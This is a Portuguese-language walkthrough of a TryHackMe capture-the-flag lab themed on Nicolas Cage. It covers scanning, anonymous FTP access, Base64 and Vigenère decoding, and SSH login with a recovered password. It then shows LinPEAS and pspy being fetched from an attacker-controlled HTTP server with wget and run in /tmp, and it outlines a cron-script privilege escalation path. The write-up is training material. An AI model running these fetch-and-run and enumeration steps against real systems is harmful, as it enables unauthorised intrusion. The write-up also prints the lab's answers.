# Break-Out-The-Cage
---
# Introdução

O laboratório ["Break Out The Cage"](https://tryhackme.com/room/breakoutthecage1) da TryHackMe é um desafio de segurança cibernética focada em técnicas de exploração web, análise, forense e quebra de cifras. Baseado no tema do ator Nicholas Cage, este laboratório apresenta múltiplas camadas de segurança que precisam ser contornadas para obter acesso ao sistema.

## Objetivos Principais:

1. Explorar serviços expostos (FTP, HTTP)
2. Analisar e decodificar mensagens criptografadas
3. Identificar e explorar vulnerabilidades web
4. Obter acesso ao sistema e escalar privilégios

## Habilidades Desenvolvidas

- Enumeração de rede e serviços
- Análise de arquivos e esteganografia
- Quebra de cifras (Base64, Vigenère)
- Exploração de vulnerabilidades web

---
# Mapeamento da Rede

## Comando de Varredura

```bash
nmap -sC -sV -oN open_ports.txt 10.81.137.168
```

**Explicação das Flags:**

- `-sC`: Executa scripts padrão do Nmap (default scripts)
- `-sV`: Detecta versão dos serviços (version detection)
- `-oN open_ports.txt`: Salva a saída em formato normal no arquivo `open_ports.txt`
- `10.81.137.168`: Endereço IP do alvo

## Resultado da Varredura

```text
Nmap scan report for 10.81.137.168
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.150.236
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análise dos Resultados

**Portas Abertas e Serviços:**

1. **Porta 21 (FTP)**:
    - Servidor: vsftpd 3.0.3
    - **Vulnerabilidade crítica**: `Anonymous FTP login allowed`
    - Arquivo disponível: `dad_tasks`

2. **Porta 22 (SSH)**:    
    - Servidor: OpenSSH 7.6p1 Ubuntu
    - Versão estável, mas versões antigas podem ter exploits

3. **Porta 80 (HTTP)**:    
    - Servidor: Apache 2.4.29
    - Título da página: "Nicholas Cage Stories"
    - Potencial para vulnerabilidades web

**Ponto Crítico Identificado:**

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

**Significado:** O servidor FTP permite login anônimo, o que significa que qualquer usuário pode acessar o FTP sem credenciais. Esta é uma configuração insegura que frequentemente leva à exposição de dados sensíveis.

---
# Exploração da Porta FTP

## Conexão ao Servidor FTP

```bash
ftp 10.81.137.168
```

**Processo de Conexão:**

1. Será solicitado um nome de usuário → Digitar `anonymous`
2. Será solicitada uma senha → Pressionar Enter (senha em branco)
3. Código de resposta `230` indica login bem-sucedido

## Enumeração de Arquivos

Ao usar o comando `ls -al` para listar todos os arquivos (inclusive os ocultos) é possível visualizar as arquivos presentes no servidor FTP.

```bash
ftp> ls -al
229 Entering Extended Passive Mode (|||17261|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
```

**Análise do Output:**

- `.` e `..`: Diretório atual e diretório pai
- `dad_tasks`: Arquivo de 396 bytes, permissões 644 (leitura para todos)
- Proprietário: UID 0 (root), GID 0 (root)

## Download do Arquivo

No servidor FTP não é possível fazer a leitura do arquivo, então é necessário transferir o arquivo para a nossa máquina de atacante da seguinte forma:

```bash
ftp> get dad_tasks
```

**Explicação:** O comando `get` transfere o arquivo do servidor FTP para a máquina local mantendo o mesmo nome.

## Análise do Conteúdo

Fora do servidor FTP é possível identificar o arquivo `dad_tasks` e ao utilizar o comando `cat`:

```bash
cat dad_tasks
```

**Conteúdo do Arquivo:**

```text
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

**Observação Inicial:** O padrão do texto (caracteres A-Z, a-z, 0-9, +, /, =) é característico de codificação **Base64**.

## Identificação da Cifra

Utilizando o [Cipher Identifier da Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier):

![Resultado Base64](assets/Pasted%20image%2020260123093835.png)

**Resultado:** O algoritmo identifica com alta probabilidade (100%) que se trata de **Base64**.

## Decodificação Base64

```bash
base64 -d dad_tasks > base64_dadtasks
```

**Parâmetros do Comando:**

- `-d`: Modo decode (decodificar)
- `dad_tasks`: Arquivo de entrada
- `> base64_dadtasks`: Redireciona a saída para um novo arquivo

**Conteúdo Decodificado:**

```text
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

**Análise:** O texto ainda parece cifrado, indicando camadas múltiplas de codificação.

## Identificação da Segunda Cifra

Utilizando novamente o Cipher Identifier:

![Resultado Vigenere Cipher](assets/Pasted%20image%2020260123094438.png)

**Resultado:** Identificado como **Vigenère Cipher** com 89% de probabilidade.

**Características da Cifra de Vigenère:**

- Cifra polialfabética (usa múltiplos alfabetos de substituição)
- Requer uma chave para decodificação
- Historicamente conhecida como "le chiffre indéchiffrable"

---
# Exploração da Página Web (Porta 80)

## Página Inicial

![Página Web](assets/Pasted%20image%2020260123094807.png)

**Observação:** A página inicial é estática e não contém links funcionais ou formulários interativos e o seu código fonte não contém nada que seja importante.

## Enumeração de Diretórios com Gobuster

```bash
gobuster dir -u 10.81.137.168 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

**Parâmetros do Comando:**

- `dir`: Modo de enumeração de diretórios
- `-u 10.81.137.168`: URL alvo
- `-w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`: Wordlist contendo possíveis nomes de diretórios

**Resultado:**

```text
images               (Status: 301) [Size: 315] [--> http://10.81.137.168/images/]
html                 (Status: 301) [Size: 313] [--> http://10.81.137.168/html/]
scripts              (Status: 301) [Size: 316] [--> http://10.81.137.168/scripts/]
contracts            (Status: 301) [Size: 318] [--> http://10.81.137.168/contracts/]
auditions            (Status: 301) [Size: 318] [--> http://10.81.137.168/auditions/]
```

**Análise dos Diretórios:**

- `images/`: Provavelmente contém imagens do site
- `html/`: Código HTML adicional
- `scripts/`: Scripts do lado do cliente/servidor
- `contracts/`: Possíveis documentos contratuais
- `auditions/`: Arquivos de audição (potencialmente interessantes)

## Investigação do Diretório Auditions

Após analisar os subdomínios foi possível identificar um arquivo de interesse no subdomínio `/auditions`, um arquivo de áudio nomeado `must_practice_corrupt_file.mp3`.

![Auditions](assets/Pasted%20image%2020260123095707.png)

É possível fazer download do arquivo através do seguinte comando:

```bash
wget http://10.81.137.168/auditions/must_practice_corrupt_file.mp3
```

## Análise Forense do Arquivo MP3

**Técnica:** Análise de espectrograma - método de esteganografia que esconde informações visuais em arquivos de áudio.

**Ferramenta:** [Sonic Visualiser](https://www.sonicvisualiser.org/download.html)

**Processo:**

1. Abrir o arquivo MP3 no Sonic Visualiser
2. Adicionar uma nova camada de espectrograma (tecla `G`)
3. Ajustar os parâmetros para melhor visualização

**Resultado da Análise:**

![Espectrograma](assets/Pasted%20image%2020260123101446.png)

**Texto Identificado:** `namelesstwo`

**Significado:** Este texto provavelmente serve como **chave** para a cifra de Vigenère identificada anteriormente.

## Decodificação da Cifra de Vigenère

**Ferramenta:** [Cryptii - Vigenère Cipher](https://cryptii.com/pipes/vigenere-cipher)

**Configuração:**

- Texto cifrado: Conteúdo do arquivo após decodificação Base64
- Chave: `namelesstwo`
- Modo: Decrypt

**Processo de Decodificação:**

![Descriptografando a Cifra](assets/Pasted%20image%2020260123102626.png)

**Texto Decodificado Final:**

```text
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

## Conclusão da Primeira Fase

**Flag Obtida:** `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

**Análise da Flag:**

- Referência ao filme "Ghost Rider" estrelado por Nicholas Cage
- Formato típico de flags em CTFs (sem espaços, mistura de palavras)
- Será utilizada como credencial nas próximas etapas do laboratório

---
# Explorando SSH

## Conexão SSH com as Credenciais Descobertas

Após descobrir a flag `Mydadisghostrideraintthatcoolnocausehesonfirejokes`, identificamos que esta é a senha do usuário **Weston**. Podemos nos conectar via SSH utilizando:

```bash
ssh weston@10.81.137.168/
```

**Explicação do comando:**

- `ssh`: Protocolo Secure Shell para conexão remota segura
- `weston`: Nome do usuário no servidor remoto
- `@10.81.137.168`: Endereço IP do servidor alvo

**Processo de autenticação:**

1. Será solicitada a senha do usuário Weston
2. Inserir: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`
3. Conexão bem-sucedida é estabelecida

**Saída da conexão:**

```text
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 23 11:11:58 UTC 2026

  System load:  0.0                Processes:           94
  Usage of /:   20.3% of 19.56GB   Users logged in:     0
  Memory usage: 33%                IP address for ens5: 10.81.151.219
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
```

**Informações importantes obtidas:**

- Sistema: Ubuntu 18.04.4 LTS
- Kernel: 4.15.0-101-generic
- Hostname: `national-treasure` (revelado posteriormente)
- Último login: 2020 (sistema pouco utilizado)

## Enumeração de Usuários do Sistema

```bash
cat /etc/passwd | grep -E "(bash|sh)$"
```

**Explicação do comando:**

- `cat /etc/passwd`: Exibe o arquivo que contém informações dos usuários
- `|`: Pipe - envia a saída do primeiro comando como entrada do segundo
- `grep -E "(bash|sh)$"`: Filtra linhas que terminam com "bash" ou "sh"
    - `-E`: Usa expressões regulares estendidas
    - `(bash|sh)$`: Padrão que casa com "bash" ou "sh" no final da linha

**Resultado:**

```text
root:x:0:0:root:/root:/bin/bash
cage:x:1000:1000:cage:/home/cage:/bin/bash
weston:x:1001:1001::/home/weston:/bin/bash
```

**Análise dos usuários:**

1. **root** (UID 0): Superusuário com privilégios totais
2. **cage** (UID 1000): Usuário padrão, provavelmente o principal
3. **weston** (UID 1001): Nosso usuário atual

## Verificação de Privilégios Sudo

```bash
sudo -l
```

**Explicação do comando:**

- `sudo`: Executa comandos com privilégios elevados
- `-l`: Lista os comandos que o usuário atual pode executar com sudo
- Será solicitada a senha do usuário Weston

**Resultado:**

```text
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

**Análise do output:**

1. **Defaults**: Configurações padrão do sudo
    - `env_reset`: Reseta variáveis de ambiente para segurança
    - `mail_badpass`: Envia email em tentativas de senha incorreta        
    - `secure_path`: PATH seguro definido (impede PATH hijacking)

2. **Privilégios específicos**:
    - Weston pode executar `/usr/bin/bees` como **root**        
    - Isso é um vetor potencial de escalação de privilégios

## Análise do Binário Bees

```bash
cd /usr/bin/
cat bees
```


**Explicação:**

- `cd /usr/bin/`: Navega para o diretório de binários do sistema
- `cat bees`: Exibe o conteúdo do arquivo `bees`

**Resultado:**

```text
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

**Análise do script:**

1. **Shebang**: `#!/bin/bash` - Indica que é um script bash
2. **Comando `wall`**:
    - Envia mensagem para todos os usuários logados
    - Executa com privilégios de root quando chamado via sudo
3. **Conteúdo**: Apenas exibe uma mensagem, sem funcionalidade útil

**Ponto importante**: Embora o script atual seja inofensivo, como Weston pode executá-lo como root, ele pode ser **modificado ou explorado** de várias formas:

- Substituir o script por um payload malicioso
- Explorar possíveis vulnerabilidades no script
- Usar como ponto de entrada para outros ataques

---
# Enumerando com LinPeas

## Transferência do Script LinPEAS

### No Computador Atacante (Kali Linux)

Primeiro, localizamos e copiamos o scrpit LinPEAS:

```bash
cp /usr/share/peass/linpeas/linpeas.sh ~
```

**Explicação:**

- `/usr/share/peass/linpeas/linpeas.sh`: Localização padrão do LinPEAS em Kali Linux
- `~`: Diretório home do usuário atual

Em seguida, iniciamos um servidor web simples para transferência:

```bash
sudo python3 -m http.server 80
```

**Explicação:**

- `sudo`: Executa com privilégios de root (necessário para porta 80)
- `python3 -m http.server 80`: Inicia servidor HTTP na porta 80
    - `-m http.server`: Módulo Python para servidor HTTP simples
    - `80`: Porta padrão HTTP

### No Servidor Alvo (Como Weston)

Primeiro, navegamos para o diretório `/tmp`:

```bash
cd /tmp
```

**Por que `/tmp`?**

- Diretório temporário com permissões de escrita para todos os usuários
- Ideal para transferência de arquivos
- Arquivos podem ser executados
- O conteúdo é geralmente limpo após reinicialização

Em seguida, baixamos o script LinPEAS:
```bash
wget 'http://{IP_ATACANTE}:80/linpeas.sh'
```

**Explicação:**

- `wget`: Ferramenta para download via HTTP/HTTPS/FTP
- `{IP_ATACANTE}`: Substituir pelo IP da sua máquina atacante
- `linpeas.sh`: Nome do arquivo a ser baixado

Tornamos o script executável e o executamos:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

**Explicação:**

- `chmod +x linpeas.sh`: Adiciona permissão de execução ao arquivo
- `./linpeas.sh`: Executa o script (`. /` indica diretório atual)

## Resultados Interessantes do LinPEAS

```text
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files

  Group cage:
/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quotes
```

**Análise dos resultados:**

1. **Arquivos graváveis pelo grupo "cage"**:
    - Weston pertence ao grupo cage? (`id` para verificar)        
    - Se sim, pode modificar arquivos nestes diretórios

2. **Localização**: `/opt/.dads_scripts/`
    - `.dads_scripts` (começa com ponto) - diretório oculto        
    - `/opt/`: Diretório para software adicional/terceiros

3. **Significado**:
    - Acesso de escrita pode permitir manipulação de scripts
    - Potencial para escalação se scripts forem executados com privilégios elevados

## Enumeração com pspy

### O que é pspy?

**pspy** é uma ferramenta que monitora processos em tempo real sem necessitar de privilégios root. É útil para:

- Detectar tarefas agendadas (cron jobs)
- Identificar processos automáticos
- Descobrir scripts executados periodicamente

### Transferência do pspy

**No computador atacante:**

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

**No servidor alvo:**

```bash
cd /tmp
wget 'http://{IP_ATACANTE}:80/pspy64'
chmod +x pspy64
./pspy64
```

### Resultados Importantes do pspy

```text 
CMD: UID=1000  PID=27306  | python /opt/.dads_scripts/spread_the_quotes.py 
CMD: UID=1000  PID=27305  | /bin/sh -c /opt/.dads_scripts/spread_the_quotes.py 
```

(**Análise detalhada:**

1. **Processo identificado**: `spread_the_quotes.py`
    
    - Executado como UID 1000 (usuário `cage`)
    - Localizado em `/opt/.dads_scripts/`

2. **Execução periódica**:    
    - Provavelmente um cron job ou serviço agendado
    - Executa automaticamente em intervalos regulares

3. **Implicações de segurança**:    
    - Se Weston pode modificar `spread_the_quotes.py` (devido às permissões de grupo)
    - E o script é executado automaticamente como usuário `cage`
    - Então Weston pode executar código como `cage`

4. **Cadeia de exploração potencial**:

```text
Weston (escreve) → spread_the_quotes.py (modificado) → Executado como cage → Acesso como cage
```

---
# Resumo das Técnicas Utilizadas

---
# Lições de Segurança Aprendidas

---
# Sugestões Mitigação


---
# Conclusão

---
# Referências

[PSPY64](https://www.kali.org/tools/pspy/)
[Sonic Visualiser](https://www.sonicvisualiser.org/download.html)
[Cipher Identifier da Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)
[Cryptii - Vigenère Cipher](https://cryptii.com/pipes/vigenere-cipher)
["Break Out The Cage"](https://tryhackme.com/room/breakoutthecage1)
